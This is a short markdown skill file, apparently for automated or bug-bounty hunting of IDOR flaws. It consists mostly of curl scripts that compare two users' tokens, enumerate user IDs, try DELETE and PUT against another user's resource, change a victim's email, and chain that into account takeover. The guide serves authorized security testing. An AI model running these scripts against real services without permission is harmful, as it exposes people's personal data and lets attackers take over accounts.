---
name: hunt-idor
description: IDOR/BOLA — differential testing, two-session comparison, privilege escalation. Every candidate must pass 7 gates.
---

# IDOR HUNTING — 3 BULLETS MAX

**Core:** User A accessing User B's resource = vulnerability.

## DIFFERENTIAL
```bash
TOKEN_A="attacker"; TOKEN_B="victim"; ID="victim-resource-id"
# Baseline: A reads own data
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/users/me"
# Test: A reads B's data → should FAIL
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/users/$ID"
```

## ENUMERATION
```bash
# Sequential
for id in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/users/$id")
  [ "$code" == "200" ] && echo "[+] ID $id accessible"
done
# Method swap
for m in GET PUT PATCH DELETE; do
  curl -s -o /dev/null -w "$m: %{http_code}\n" -X $m -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/users/$ID"
done
# Old version
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/v1/users/$ID"
```

## STATE CHANGE
```bash
# Before → Attack → After
BEFORE=$(curl -s -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/users/$ID")
curl -s -X PUT -H "Authorization: Bearer $TOKEN_A" -d '{"email":"evil@test.com"}' "https://target.com/api/users/$ID"
AFTER=$(curl -s -H "Authorization: Bearer $TOKEN_B" "https://target.com/api/users/$ID")
# If email changed → WRITE IDOR
```

## ESCALATION
```
IDOR read → enumerate all users → mass PII → Critical
IDOR write → change email → password reset → ATO → Critical
IDOR read → find admin → admin endpoint → Critical
```

## FALSE POSITIVES
- Same data for all IDs → not IDOR
- `/me` returns data → session reference, not resource ID
- 200 but empty/null → not sensitive data
